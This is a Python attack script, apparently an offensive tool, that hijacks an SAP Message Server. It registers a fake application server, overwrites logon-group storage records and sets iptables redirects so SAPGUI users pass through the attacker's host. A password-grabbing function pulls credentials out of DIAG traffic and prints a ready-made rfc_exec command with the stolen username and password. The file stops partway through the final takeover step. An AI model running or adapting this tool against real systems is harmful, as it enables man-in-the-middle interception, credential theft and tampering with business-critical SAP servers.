#!/usr/bin/env python
#
# Register via Message Server a fake AS for a given logon group and redirect
# users to the real one. This requires network access to the MS internal port 39NN.
# -- gelim

from pysap.SAPNI import SAPNI,SAPNIStreamSocket
from pysap.SAPMS import SAPMS,SAPMSProperty,SAPMSLogon,SAPMSClient4,SAPMSAdmRecord
from pysap.SAPMS import ms_flag_values,ms_iflag_values,ms_opcode_values
from pysap.SAPMS import ms_client_status_values,ms_opcode_error_values
from pysap.SAPMS import ms_adm_opcode_values, ms_adm_rzl_strg_type_values
from pysap.SAPDiag import SAPDiag, SAPDiagDP
from pysap.SAPDiagItems import *
from scapy.supersocket import StreamSocket
from scapy.sendrecv import sniff
from scapy.utils import hexdump,inet_ntoa,inet_aton
from scapy.packet import bind_layers
from scapy.layers.inet import TCP,Raw
from scapy.config import conf
from ansicolor import red,green,blue,yellow,cyan,magenta
from pprint import pprint
import subprocess
import argparse
import datetime
import tempfile
import logging
import socket
import struct
import random
import signal
import time
import sys
import os
import re


help_desc = '''
Register via Message Server a fake AS for a given logon group and redirect
users to the real one. This requires network access to the MS internal port 39NN.
-- gelim
'''

def sigint_handler(signal, frame):
    # Undo here our storage modification via ADM packets
    try:
        r = s.sr(p_adm_del_i)
        r = s.sr(p_adm_del_c_lg)
    except:
        logger.error("Got an exception when deleting our dispatcher from LG")
        pass

    # restore logon groups
    logger.info("")
    logger.info("[+] Restoring previous LG server")
    for lg in logon_groups_init.keys():
        p = p_adm_write_c_lg
        p.adm_records[0].rzl_strg_name = lg
        p.adm_records[0].rzl_strg_value = logon_groups_init[lg]
        try:
            r = s.sr(p)
        except:
            pass

    # Dump the updated LG info for verification
    try:
        r = s.sr(p_adm_readall_ofs)
        records_ofs = parse_adm_readall_ofs(r)
    except Exception as e:
        logger.error("Got an exception when reading MS storage")
        logger.error(e.message)
        pass

    # clean iptables rules
    logger.info("[+] Cleaning iptables rules")
    disable_iptables_redirect(attacked_as['iface'], as_ip, as_port,
                             fake_as['ip'], fake_as['diag_port'], comment)
    
    ms_logout(s)
    exit(0)

# Init logging subsystem
# name = will be used as part of filename
# (and internal name for logger)
def init_logger(logname, level):
    # generic log conf
    logger = logging.getLogger(logname)
    logger.setLevel(level)
    file_format = logging.Formatter("%(asctime)s [%(levelname)-6s] %(message)s")
    console_format = logging.Formatter("[%(levelname)-5s] %(message)s")
    # console handler
    ch = logging.StreamHandler(sys.stdout)
    ch.setLevel(level)
    ch.setFormatter(console_format)
    logger.addHandler(ch)

    # file handler
    # using parent pid in filename to have 'session'-like log files
    logfile="%s/%s_%d.log" % (tempfile.gettempdir(), logname, os.getppid())
    fh = logging.FileHandler(logfile, "a")
    fh.setLevel(level)
    fh.setFormatter(file_format)
    logger.addHandler(fh)
    return logger

def net_get_ip():
    return [(s.connect(('8.8.8.8', 53)),
             s.getsockname()[0],
             s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]

def gen_ms_servername(host, sid, instance):
    ms_fromname_len = 40 # hardcoded stuff
    as_name = '%s_%s_%s' % (host, sid, instance)
    num_space = 40 - len(as_name)
    if num_space < 0:
        logger.error("[!] You have a hostname too long (hostname: %s)" % host)
        logger.error("    Shorten it by %d chars at least " % -num_space)
        exit(1)
    as_name += ' '*num_space
    return as_name

def ms_build_del_logon_by_type(type):
    return SAPMS(toname=msg_server_name,
                 fromname=my_name,
                 flag='MS_REQUEST',
                 iflag='MS_SEND_NAME',
                 opcode='MS_DEL_LOGON',
                 logon=SAPMSLogon(type=type,
                                  logonname_length=0,
                                  prot_length=0,
                                  host_length=0,
                                  misc_length=0,
                                  address6_length=65535))

def ms_buld_prop_set_release(release = '745', patchno = '15' ):
    return  SAPMS(toname=msg_server_name,
                           flag='MS_REQUEST',
                           fromname=my_name,
                           opcode='MS_SET_PROPERTY',
                           opcode_charset=0,
                           property=SAPMSProperty(id='Release information',
                                                  release=release,
                                                  patchno=int(patchno),
                                                  platform=390))


def ms_build_set_logon(ptype, serv_info):
    if ptype == 'diag':
        logon_type = 'MS_LOGON_DIAG'
        port = serv_info['diag_port']
    elif ptype == 'rfc':
        logon_type = 'MS_LOGON_RFC'
        port = serv_info['rfc_port']
    address = serv_info['ip']
    host = serv_info['fqdn']

    p = SAPMS(fromname=my_name,
              toname=msg_server_name,
              flag='MS_REQUEST',
              iflag='MS_SEND_NAME',
              opcode='MS_SET_LOGON',
              logon=SAPMSLogon(type=logon_type,
                               port=port,
                               address=address,
                               logonname_length=0,
                               prot_length=0,
                               host_length=len(host),
                               host=host,
                               misc_length=4,
                               misc='LB=9'))/Raw(load="\xff\xff")
    return p

#
# Print and if required send an answer to 
# the received packet
# s: SAPNISocket
# p: received SAPMS packet
#
def handle_answer(s, p):
    fromname = p.fromname
    try:
        flag = ms_flag_values[p[SAPMS].flag]
    except:
        flag = "0"
    try:
        opcode = str(ms_opcode_values[p[SAPMS].opcode])
    except:
        opcode = str(p[SAPMS].opcode)
    try:
        opcode_err = str(ms_opcode_error_values[p[SAPMS].opcode_error])
    except:
        opcode_err = 'None'

    if opcode_err == 'MSOP_OK':
        opcode_err = green(opcode_err)
    else:
        opcode_err = red(opcode_err, bold=True)

    if p.key != null_key:
        key = " key: " + yellow('NOT NULL', bold=True)
        logger.error("[!] Out of order packets, reload this script.")
        #s.close()
        #exit(0)
    else:
        key = ""
        
    logger.info("flag: " + cyan(flag) + " opcode:" + cyan(opcode) + \
        " opcode_error: " + green(opcode_err) + key)


def as_print(as_d, active=True):
    print "-"*120
    for a in as_d.keys():
        if active and as_d[a]['status'] != 1: # ACTIVE
            continue
        print ("%s" % a).ljust(30) + "| " + \
            ("%s" % as_d[a]['host']).ljust(20) + "| " + \
            ("%s" % as_d[a]['ip']).ljust(16) + "| " + \
            ("%s" % as_d[a]['port']).ljust(8) + "| " + \
            ("%s" % as_d[a]['type']).ljust(27) + "| " + \
            ("%s" % as_d[a]['status'])
    print "-"*120

def ms_connect(mshost, msport, login_packet):
    try:
        s = SAPNIStreamSocket.get_nisocket(mshost, msport)
    except socket.error:
        logger.error("[!] Connection error to %s:%s" % (mshost, msport))
        exit(-1)
    logger.info("[+] Sending MS_LOGIN_2")
    r = s.sr(login_packet)
    handle_answer(s, r)
    return s

def ms_logout(s):
    logger.info("[+] Sending MS_LOGOUT")
    try:
        s.send(p_logout)
        s.close()
    except:
        logger.error("Socket error when sending MS_LOGOUT")


# Send a sequence of 3 packets to get the list of application servers
# registered to the message server This is called anonymous because
# fromname is '-'
def ms_get_server_list_anon(s):
    as_list_d = dict()
    for p in p_get_server_list_l:
        logger.info("[+] Sending %s" % ms_opcode_values[p.opcode])
        s.send(p)
    r = s.recv()

    if not r.clients:
        logger.info("[!] Answer doesn't contain server list.")
        #s.close()
        return as_list_d # dict()

    handle_answer(s, r)
    for c in r.clients:
        as_list_d[c.client.strip()] = {"host": c.host.strip(),
                                       "ip": c.hostaddrv4,
                                       "port": c.servno,
                                       "type": c.sprintf('%SAPMSClient4.msgtype%'),
                                       "status": ms_client_status_values[c.status]}
    return as_list_d

# This is a slighty different packets for getting server list when we
# are not anonymous anymore
def ms_get_server_list(s, key):
    as_list_d = dict()
    p = SAPMS(fromname=my_name,
              toname=msg_server_name,
              key=key,
              flag='MS_REQUEST',
              opcode='MS_SERVER_LST',
              opcode_error='MSOP_OK',
              opcode_version=104,
              opcode_charset=3)

    r = s.sr(p)
    
    if not r.clients:
        logger.error("[!] Answer doesn't contain server list.")
        #s.close()
        return as_list_d # dict()
    
    handle_answer(s, r)
    for c in r.clients:
        as_list_d[c.client.strip()] = {"host": c.host.strip(),
                                       "ip": c.hostaddrv4,
                                       "port": c.servno,
                                       "type": c.sprintf('%SAPMSClient4.msgtype%'),
                                       "status": ms_client_status_values[c.status]}
    return as_list_d

#
# Get the answer from a ADM_STRG_READALL_I and parse it like:
# [ {server1: [int1, int2, ... int9],
# [
#
def parse_adm_readall_i(p):
    if not p.haslayer('SAPMSAdmRecord'):
        logger.error("Packet has no 'SAPMSAdmRecord'.")
        exit(-1)
    logger.info("[+] Dumping Integer Storage")
    records = dict()
    for e in p.adm_records:
        records[e.rzl_strg_name] = [e.rzl_strg_uptime,
                                    e.rzl_strg_integer1,
                                    e.rzl_strg_delay,
                                    e.rzl_strg_integer3,
                                    e.rzl_strg_users,
                                    e.rzl_strg_quality,
                                    e.rzl_strg_integer6,
                                    e.rzl_strg_integer7,
                                    e.rzl_strg_integer8,
                                    e.rzl_strg_integer9]

    # get back those 32 bits signed integers
    f = lambda x: x - 4294967296 if x > 0x7fffffff else x
    # pretty print that
    for r in records.keys():
        tmp_r = map(f , records[r])
        print green(r) + '\t: ' + '\t'.join([str(e) for e in tmp_r])
    return records

def parse_logon_group(v):
    marker, trash1, ip, trash2, port, kernel = struct.unpack('>9sbIIh4s', v[:24])
    ip = struct.pack('!I', ip)
    return [inet_ntoa(ip), str(port), kernel]

def parse_adm_readall_ofs(p):
    if not p.haslayer('SAPMSAdmRecord'):
        print "Packet has no 'SAPMSAdmRecord'."
        exit(-1)
    logger.info("[+] Dumping Text Storage")
    records = dict()
    for e in p.adm_records:
        name = e.rzl_strg_name
        value = str(e.rzl_strg_value)
        type_v = ms_adm_rzl_strg_type_values[e.rzl_strg_type]
        records[name] = (type_v, value)

    # pretty print that
    for r in records.keys():
        if records[r][1].startswith('LG_EYECAT'):
            print red(r, bold=True) + '\t: ' + ' '.join(parse_logon_group(records[r][1]))
        elif records[r][0].endswith('_C'):
            print green(r) + '\t: ' + str(records[r][1])
    return records

def get_logon_groups(records):
    lg = dict()
    for r in records.keys():
        if records[r][1].startswith('LG_EYECAT'):
            lg[r] = records[r][1]
    return lg

def build_logon_group(ip, port, kernel):
    return 'LG_EYECAT' + '\x01' + inet_aton(ip) + '\x00\x00\x00\x00' + \
        struct.pack('!h', port) + kernel + '\x00'*6 + (' '*5).encode('UTF-16-LE')

def diag_grab_password(packet):
    if not packet.haslayer(SAPMS):
        return
    p=Packet()
    atoms = None
    try:
        p = SAPDiag(str(packet[SAPMS]))
        atoms = p[SAPDiag].get_item(["APPL", "APPL4"], "DYNT", "DYNT_ATOM")
    except:
        pass
    # Print the Atom items information
    if atoms:
        logger.info("[*] Input fields:")
        current_user = None
        current_pass = None
        for atom in [atom for atom_item in atoms for atom in atom_item.item_value.items]:
            if atom.etype in [121, 122, 123, 130, 131, 132]:
                text = atom.field1_text or atom.field2_text
                text = text.strip()
                if not text: continue
                if atom.attr_DIAG_BSD_INVISIBLE and len(text) > 0:
                    logger.info("\tPassword field:\t%s" % green(text, bold=True))
                    current_pass = text
                else:
                    logger.info("\tRegular field:\t%s" % (text))
                    current_user = text
        if current_user and current_pass: print "$ rfc_exec.py --host %s -S %s -C XXX -U '%s' -P '%s' -c info" % (attacked_as['ip'], '00', current_user, current_pass)

def print_iptables_info(iface, old_ip, old_port, new_ip, new_port, comment):
    print
    print "Will run the following Linux commands to transparently redirect SAPGUI clients"
    print "to the real server"
    print "echo 1 > /proc/sys/net/ipv4/ip_forward"
    print "iptables -t nat -I PREROUTING -p tcp --dport %s -d %s -m comment --comment \"%s\" -j DNAT --to %s:%s" % \
        (new_port, # my fake AS port
         new_ip,   # my IP
         comment,  # unique rule identifier
         old_ip,   # real AS IP
         old_port) # real AS port
    print "iptables -t nat -I OUTPUT -p tcp --dport %s -d %s -m comment --comment \"%s\" -j DNAT --to %s:%s" % \
        (new_port, # my fake AS port
         new_ip,   # my IP
         comment,  # unique rule identifier
         old_ip,   # real AS IP
         old_port) # real AS port
    print "iptables -t nat -I POSTROUTING -o %s -m comment --comment \"%s\" -j MASQUERADE" % (iface, comment)

def enable_iptables_redirect(iface, old_ip, old_port, new_ip, new_port, comment):
    ret1 = subprocess.call(["echo 1 > /proc/sys/net/ipv4/ip_forward"], shell=True)
    cmd = "iptables -t nat -I PREROUTING -p tcp --dport %s -d %s -m comment --comment \"%s\" -j DNAT --to %s:%s" % \
        (new_port,
         new_ip,
         comment,  # unique rule identifier
         old_ip,
         old_port)
    ret2 = subprocess.call(cmd.split(" "))
    cmd = "iptables -t nat -I OUTPUT -p tcp --dport %s -d %s -m comment --comment \"%s\" -j DNAT --to %s:%s" % \
          (new_port, # my fake AS port
           new_ip,   # my IP
           comment,  # unique rule identifier
           old_ip,   # real AS IP
           old_port) # real AS port
    ret3 = subprocess.call(cmd.split(" "))
    cmd = "iptables -t nat -I POSTROUTING -o %s -m comment --comment \"%s\" -j MASQUERADE" % (attacked_as['iface'], comment)
    ret4 = subprocess.call(cmd.split(" "))
    if not [ret1, ret2, ret3, ret4] == [0, 0, 0, 0]:
        logger.error("You had a problem running one of those commands")
        print ret1, ret2, ret3, ret4
        exit(-1)

def disable_iptables_redirect(iface, old_ip, old_port, new_ip, new_port, comment):
    ret1 = subprocess.call(["echo 0 > /proc/sys/net/ipv4/ip_forward"], shell=True)
    cmd = "iptables -t nat -D PREROUTING -p tcp --dport %s -d %s -m comment --comment \"%s\" -j DNAT --to %s:%s" % \
        (new_port,
         new_ip,
         comment,  # unique rule identifier
         old_ip,
         old_port)
    ret2 = subprocess.call(cmd.split(" "))
    cmd = "iptables -t nat -D OUTPUT -p tcp --dport %s -d %s -m comment --comment \"%s\" -j DNAT --to %s:%s" % \
          (new_port, # my fake AS port
           new_ip,   # my IP
           comment,  # unique rule identifier
           old_ip,   # real AS IP
           old_port) # real AS port
    ret3 = subprocess.call(cmd.split(" "))
    cmd = "iptables -t nat -D POSTROUTING -o %s -m comment --comment \"%s\" -j MASQUERADE" % (attacked_as['iface'], comment)
    ret4 = subprocess.call(cmd.split(" "))
    if not [ret1, ret2, ret3, ret4] == [0, 0, 0, 0]:
        logger.error("You had a problem running one of those commands")
        print ret1, ret2, ret3, ret4
        exit(-1)

def ask_logon_group_to_hijack(lg_init):
    if len(lg_init.keys()) == 0:
        logger.info("This server does not have any Logon Groups defined.")
        logger.info("It is thus impossible to takeover any dispatcher via Message Server.")
        exit(0)
    if len(lg_init.keys()) > 1:
        print
        print "[+] Select logon group to take over"
        for lg in lg_init.keys():
            print "\t%s: %s" % (lg_init.keys().index(lg), lg)
        lg_to_mitm = int(raw_input("Enter number: "))
        if lg_to_mitm not in range(0, len(lg_init.keys())):
            print "Invalid entry"
            exit(0)
        lg_name = lg_init.keys()[lg_to_mitm]
    else: lg_name = lg_init.keys()[0]
    return lg_name

def extract_serv_ver(r, substr, l):
    return r[r.index(substr)+len(substr):r.index(substr)+len(substr)+l]

#########################
# GLOBAL PACKETS / VARS #
#########################

sleep = 1
# that's you
short_host = "sapdev%.4d" % (random.randint(0, 9999))
fake_as = {"ip": net_get_ip(),
           "host": short_host,
           "diag_port": 3200,
           "rfc_port": 3300,
           "fqdn": "%s.fake.tld" % short_host}

# that's our target we want to pwn
attacked_as = {"ip": "172.16.100.50",
               "msport": 3901,
               "sid": "CIA",
               "instance": "00",
               "iface": None,
               "release":"745",
               "patchno":"15"}


my_name = gen_ms_servername(fake_as["host"], attacked_as["sid"], attacked_as["instance"])
#attacked_name = gen_ms_servername(attacked_as["host"], attacked_as["sid"], attacked_as["instance"])
anon_name = '-' + ' '*39
msg_server_name = 'MSG_SERVER' # \x00MsgServer\x00FN_CHECK\x00FN_TP\x00tp$('
null_key = "\x00" * 8

p_logout = SAPMS(toname=anon_name,
                 fromname=anon_name,
                 flag=0,
                 iflag='MS_LOGOUT')

p_login_anon = SAPMS(toname=anon_name,
                     fromname=anon_name,
                     flag=0,
                     iflag='MS_LOGIN_2')

p_login_diag = SAPMS(toname=anon_name,
                     fromname=my_name,
                     msgtype='DIA+UPD+BTC+SPO+UP2+ICM',
                     flag=0,
                     iflag='MS_LOGIN_2',
                     diag_port=fake_as['diag_port'])

p_login_rfc = SAPMS(toname=anon_name,
                     fromname=my_name,
                     msgtype='DIA+UPD+BTC+SPO+UP2+ICM',
                     flag=0,
                     iflag='MS_LOGIN_2',
                     diag_port=fake_as['rfc_port'])

p_reload = SAPMS(toname=msg_server_name,
                 fromname=anon_name,
                 flag='MS_REQUEST',
                 opcode='MS_FILE_RELOAD',
                 opcode_version=1,
                 opcode_charset=3,
                 opcode_value="\x36")

p_checkacl = SAPMS(toname=msg_server_name,
                   fromname=anon_name,
                   flag='MS_REQUEST',
                   opcode='MS_CHECK_ACL',
                   opcode_version=1,
                   opcode_charset=0)

p_kernel_info = SAPMS(toname=msg_server_name,
                      flag='MS_REQUEST',
                      fromname=my_name,
                      opcode='MS_DUMP_INFO',
                      dump_command='MS_DUMP_RELEASE',
                      dump_dest=2,
                      )

p_prop_set_release = SAPMS(toname=msg_server_name,
                           flag='MS_REQUEST',
                           fromname=my_name,
                           opcode='MS_SET_PROPERTY',
                           opcode_charset=0,
                           property=SAPMSProperty(id='Release information',
                                                  release='745',
                                                  patchno=15,
                                                  platform=390))

p_prop_set_service = SAPMS(fromname=my_name,
                           toname=msg_server_name,
                           flag='MS_REQUEST',
                           iflag='MS_SEND_NAME',
                           opcode='MS_SET_PROPERTY',
                           opcode_version=1,
                           opcode_charset=0,
                           property=SAPMSProperty(client='',
                                                  id='MS_PROPERTY_SERVICE',
                                                  service=1))/Raw(load='\x07')

p_get_server_list_l = [ SAPMS(fromname=anon_name,
                              toname=msg_server_name,
                              flag='MS_ONE_WAY',
                              iflag='MS_SEND_NAME',
                              opcode='MS_SERVER_LONG_LIST',
                              opcode_version=1,
                              opcode_charset=0),
                        
                        SAPMS(fromname=anon_name,
                              toname=msg_server_name,
                              flag='MS_ONE_WAY',
                              iflag='MS_SEND_NAME',
                              opcode='MS_SERVER_LONG_LIST',
                              opcode_version=1,
                              opcode_charset=0),
                        
                        SAPMS(fromname=anon_name,
                              toname=msg_server_name,
                              flag='MS_REQUEST',
                              iflag='MS_SEND_NAME',
                              opcode='MS_SERVER_LST',
                              opcode_version=104,
                              opcode_charset=3) ]

p_mod_state = SAPMS(fromname=my_name,
                    toname=anon_name,
                    msgtype='DIA+ENQ',
                    flag=0x08,
                    iflag="MS_MOD_STATE")


p_change_ip = SAPMS(fromname=my_name,
                    toname=msg_server_name,
                    flag='MS_REQUEST',
                    iflag='MS_SEND_NAME',
                    opcode='MS_CHANGE_IP',
                    opcode_version=2,
                    opcode_charset=0,
                    change_ip_addressv4=fake_as["ip"],
                    change_ip_addressv6='::ffff:' + fake_as["ip"])

p_set_ip_property = SAPMS(fromname=my_name,
                          toname=anon_name,
                          flag='MS_REQUEST',
                          iflag='MS_SEND_NAME',
                          opcode='MS_SET_PROPERTY')/SAPMSProperty(client=my_name,
                                                                  id='MS_PROPERTY_IPADR',
                                                                  address=fake_as['ip'])
                          
p_change_active = SAPMS(fromname=my_name,
                    toname=anon_name,
                    flag='MS_REQUEST',
                    iflag='MS_MOD_STATE',
                    msgtype='DIA')
                    
p_server_long_list = SAPMS(fromname=my_name,
                           toname=msg_server_name,
                           flag='MS_REQUEST',
                           iflag='MS_SEND_NAME',
                           opcode='MS_SERVER_LONG_LIST',
                           opcode_version=1,
                           opcode_charset=0)
p_server_chg = SAPMS(fromname=my_name,
                     toname=msg_server_name,
                     flag='MS_REQUEST',
                     iflag='MS_SEND_NAME',
                     opcode='MS_SERVER_CHG',
                     opcode_version=4,
                     opcode_charset=0)

p_get_hwid = SAPMS(fromname=my_name,
                   toname=msg_server_name,
                   flag='MS_REQUEST',
                   iflag='MS_SEND_NAME',
                   opcode='MS_GET_HWID',
                   opcode_version=1,
                   opcode_charset=0,
                   hwid=struct.pack("!I", os.getpid()))


# ADM STRG_TYPE_READALL_OFFSET_I
# will dump the content of the file:
# /usr/sap/SID/ASCS01/work/SID_msg_server_adtl_storage
p_adm_readall_i = SAPMS(fromname=my_name,
                      toname=anon_name,
                      flag='MS_ADMIN',
                      iflag='MS_ADM_OPCODES',
                      key=null_key, # TODO: CHANGE THAT AT RUNTIME (previous key + 6)
                      adm_recno=1,
                      adm_records=[SAPMSAdmRecord(opcode='AD_RZL_STRG',
                                                  rzl_strg_type='STRG_TYPE_READALL_OFFSET_I',
                                                  rzl_strg_name='                    ',
                                                  rzl_strg_uptime=7353,
                                                  rzl_strg_delay=290,
                                                  rzl_strg_integer3=7353)])

p_adm_readall_ofs = SAPMS(fromname=my_name,
                          toname=anon_name,
                          flag='MS_ADMIN',
                          iflag='MS_ADM_OPCODES',
                          key=null_key,
                          adm_recno=1,
                          adm_records=[SAPMSAdmRecord(opcode='AD_RZL_STRG',
                                                      rzl_strg_type='STRG_TYPE_READALL_OFFSET',
                                                      rzl_strg_name='                    ')])

p_adm_del_c = SAPMS(fromname=my_name,
                    toname=anon_name,
                    flag='MS_ADMIN',
                    iflag='MS_ADM_OPCODES',
                    key=null_key,
                    adm_recno=1,
                    adm_records=[SAPMSAdmRecord(opcode='AD_RZL_STRG',
                                                rzl_strg_type='STRG_TYPE_DEL_C',
                                                rzl_strg_name_length=20,
                                                rzl_strg_name='FAV_COMPUTE_TIME' + 4*' ',
                                                rzl_strg_value=' '*40,
                                                rzl_strg_padd2=' '*40)])

p_adm_del_c2 = SAPMS(fromname=my_name,
                     toname=anon_name,
                     flag='MS_ADMIN',
                     iflag='MS_ADM_OPCODES',
                     key=null_key,
                     adm_recno=1,
                     adm_records=[SAPMSAdmRecord(opcode='AD_RZL_STRG',
                                                 rzl_strg_type='STRG_TYPE_DEL_C',
                                                 rzl_strg_name_length=20,
                                                 rzl_strg_name='FAV_COMPUTE_SERVER' + ' '*2,
                                                 rzl_strg_value=' '*40,
                                                 rzl_strg_padd2=' '*40)])

p_adm_del_c_lg = SAPMS(fromname=my_name,
                     toname=anon_name,
                     flag='MS_ADMIN',
                     iflag='MS_ADM_OPCODES',
                     key=null_key,
                     adm_recno=1,
                     adm_records=[SAPMSAdmRecord(opcode='AD_RZL_STRG',
                                                 rzl_strg_type='STRG_TYPE_DEL_C',
                                                 rzl_strg_name_length=20,
                                                 rzl_strg_name='SPACE' + 15*' ',
                                                 rzl_strg_value=' '*40)])

p_adm_del_i = SAPMS(fromname=my_name,
                    toname=anon_name,
                    flag='MS_ADMIN',
                    iflag='MS_ADM_OPCODES',
                    key=null_key,
                    adm_recno=1,
                    adm_records=[SAPMSAdmRecord(opcode='AD_RZL_STRG',
                                                rzl_strg_type='STRG_TYPE_DEL_I',
                                                rzl_strg_name_length=20,
                                                rzl_strg_name=my_name,
                                                rzl_strg_value=' '*40)])



p_adm_write_i = SAPMS(fromname=my_name,
                      toname=anon_name,
                      flag='MS_ADMIN',
                      iflag='MS_ADM_OPCODES',
                      key=null_key,
                      adm_recno=1,
                      adm_records=[SAPMSAdmRecord(opcode='AD_RZL_STRG',
                                                rzl_strg_type='STRG_TYPE_WRITE_I',
                                                rzl_strg_name_length=20,
                                                    rzl_strg_name=my_name,
                                                    rzl_strg_uptime=86300,
                                                    rzl_strg_integer1=7353,
                                                    rzl_strg_users=1,
                                                    rzl_strg_quality=1,
                                                    rzl_strg_integer6=4294967245,
                                                    rzl_strg_integer7=0,
                                                    rzl_strg_integer9=3)])

p_adm_write_c_lg = SAPMS(fromname=my_name,
                         toname=anon_name,
                         flag='MS_ADMIN',
                         iflag='MS_ADM_OPCODES',
                         key=null_key,
                         adm_recno=1,
                         adm_records=[SAPMSAdmRecord(opcode='AD_RZL_STRG',
                                                     rzl_strg_type='STRG_TYPE_WRITE_C',
                                                     rzl_strg_name_length=20,
                                                     rzl_strg_name=my_name,
                                                     rzl_strg_value=' '*40)])



if __name__ == '__main__':
    signal.signal(signal.SIGINT, sigint_handler)
    parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-H', '--host', default='172.16.100.50', help='AS victim IP (default: 172.16.100.50)')
    parser.add_argument('-P', '--port', default=3901, type=int, help='AS internal message server port (default: 3901)')
    parser.add_argument('-s', '--sid', default='CIA', help='AS victim SID (default: CIA)')
    parser.add_argument('-S', '--instance', default='00', help='AS victim targeted instance (default: 00)')
    parser.add_argument('--logon-group', help='Set a Logon Group value with dispatcher IP, port, kernel info encoded like \'GROUPNAME:IP:PORT:KERNEL\'')
    parser.add_argument('-x', '--delete', action='store_true', help='Delete logon-group indicated by --logon-group parameter')
    parser.add_argument('-d', '--debug', action='store_true', help='Show debug info')
    parser.add_argument('-q', '--quiet', action='store_true', help='Don\'t show any info messages')
    
    args = parser.parse_args()

    prog = 'sap_ms_dispatcher_mitm'
    if args.quiet:
        logger = init_logger(prog, logging.NOTSET)
    elif args.debug:
        logger = init_logger(prog, logging.DEBUG)
    else:
        logger = init_logger(prog, logging.INFO)

    # update our default conf with customized version:
    attacked_as["ip"] = args.host
    attacked_as["msport"] = args.port
    attacked_as["sid"] = args.sid
    attacked_as["instance"] = args.instance
    # get external interface for accessing this AS
    ip = socket.gethostbyname(args.host)
    r = subprocess.check_output(["ip", "route", "get", ip])
    attacked_as["iface"] = re.search("dev (.*?) src", r).groups()[0].strip()

    print "[+] Attacking the following target:"
    print
    pprint(attacked_as)
    #print
    #raw_input("Go ?")
    
    conf.L3Socket = StreamSocket
    # SAPMS layer
    bind_layers(TCP, SAPNI)
    bind_layers(TCP, SAPNI)
    bind_layers(SAPNI, SAPMS)
    # SAPDIAG layer
    bind_layers(SAPDiagDP, SAPDiag,)
    bind_layers(SAPDiag, SAPDiagItem,)
    bind_layers(SAPDiagItem, SAPDiagItem,)

    # 1- Simple Login / Logout
    s = ms_connect(attacked_as["ip"], attacked_as["msport"], p_login_anon)
    logger.debug("[+] Sending MS_LOGOUT")
    ms_logout(s)

    # 2- Login, ask to reload ACL file and check ACL
    #s = ms_connect(attacked_as["ip"], attacked_as["msport"], p_login_anon)
    #logger.debug("[+] Sending MS_FILE_RELOAD")
    #r = s.sr(p_reload)
    #handle_answer(s, r)
    #logger.debug("[+] Sending MS_CHECK_ACL")
    #r = s.sr(p_checkacl)
    #handle_answer(s, r)
    #ms_logout(s)

    # 3- Login and get server list
    s = ms_connect(attacked_as["ip"], attacked_as["msport"], p_login_anon)

    as_list_d = ms_get_server_list_anon(s)
    as_print(as_list_d, False)
    ms_logout(s)

    #3.5 - Getting kernel version
    logger.debug("[+] Sending MS_DUMP_RELEASE") 
    s = ms_connect(attacked_as["ip"], attacked_as["msport"], p_login_anon)
    r = s.sr(p_kernel_info)
    attacked_as["release"] = extract_serv_ver(r[SAPMS].opcode_value, 'kernel release = ', 3)
    attacked_as["patchno"] = extract_serv_ver(r[SAPMS].opcode_value, 'source id = 0.', 3)
    logger.debug("kernel={}, patch_nbr={}".format(attacked_as["release"], attacked_as["patchno"]))

    # 4- Login and set property with our release information
    # s = ms_connect(attacked_as["ip"], attacked_as["msport"], p_login_anon)
    logger.debug("[+] Sending MS_SET_PROPERTY")
    r = s.sr(ms_buld_prop_set_release(attacked_as["release"], attacked_as["patchno"]))
    handle_answer(s, r)
    ms_logout(s)

    # 5- Login back now with our "service" name
    s = ms_connect(attacked_as["ip"], attacked_as["msport"], p_login_diag)

    logger.debug("[+] Sending MS_MOD_STATE")
    s.send(p_mod_state)
    
    # 6- Set IP address
    logger.debug("[+] Sending MS_CHANGE_IP")
    r = s.sr(p_change_ip)
    handle_answer(s, r)

    # 7- Set Logon information (RFC)
    logger.debug("[+] Sending MS_SET_LOGON (rfc)")
    r = s.sr(ms_build_set_logon("diag", fake_as))
    handle_answer(s, r)

    r = s.sr(ms_build_set_logon("rfc", fake_as))
    handle_answer(s, r)

    r = s.sr(ms_build_set_logon("rfc", fake_as))
    handle_answer(s, r)

    # 8- Set the IP Address property
    logger.debug("[+] Sending MS_SET_PROPERTY (ip)")
    r = s.sr(p_set_ip_property)
    handle_answer(s, r)

    # 9- Set status to ACTIVE
    logger.debug("[+] Changing status to ACTIVE")
    s.send(p_change_active)


    # 10- Check that we are properly registered (AS dump)
    as_list_d = ms_get_server_list_anon(s)
    as_print(as_list_d, False)

    # 11- Dump msg_server storage file
    #p = p_adm_readall_i
    #r = s.sr(p)
    #records_i = parse_adm_readall_i(r)
    r = s.sr(p_adm_readall_ofs)
    records_ofs = parse_adm_readall_ofs(r)

    if args.logon_group:
        try:
            lg_name, ip, port, kernel = args.logon_group.split(':')
        except:
            logger.error("Format error in --logon-group parameter. Should be 'GROUPNAME:IP:PORT:KERNEL'")
            exit(-1)
        if args.delete:
            logger.info("Deleting logon group '%s'" % lg_name)
            p = p_adm_del_c_lg
        else:
            logger.info("Overwriting/creating logon group '%s'" % lg_name)
            p = p_adm_write_c_lg
        if len(lg_name) >20: logger.warning("Your Logon Group name will be truncated.")
        lg_name = lg_name[:20]
        lg_name_len = len(lg_name)
        p.adm_records[0].rzl_strg_name = lg_name[:20] + " "*(20-lg_name_len)
        p.adm_records[0].rzl_strg_name_length=lg_name_len
        if args.delete:
            p.adm_records[0].rzl_strg_value = ' '*40
        else:
            p.adm_records[0].rzl_strg_value = build_logon_group(ip, int(port), kernel)
        r = s.sr(p)

        time.sleep(1)
        r = s.sr(p_adm_readall_ofs)
        parse_adm_readall_ofs(r)

    logon_groups_init = get_logon_groups(records_ofs)
    lg_name = ask_logon_group_to_hijack(logon_groups_init)
    lg_value = logon_groups_init[lg_name]
    as_ip, as_port, kernel = parse_logon_group(lg_value)
    comment = "%s_%s_%s" % (lg_name.strip(), as_ip, as_port)
    print_iptables_info(attacked_as['iface'], as_ip, as_port,
                        fake_as['ip'], fake_as['diag_port'], comment)
    raw_input(red("\nPress [Enter] when you are ready to MITM...", bold=True))
    enable_iptables_redirect(attacked_as['iface'], as_ip, as_port,
                             fake_as['ip'], fake_as['diag_port'], comment)
    
    # 12- Brace yourself, we remove main AS and put ours instead
    # Adding ourselves in the Integer part of storage
    r = s.sr(p_adm_write_i)
    p = p_adm_write_c_lg
    # and placing ourselves as the default dispatched in the asked Logon Group
    p.adm_records[0].rzl_strg_name = lg_name
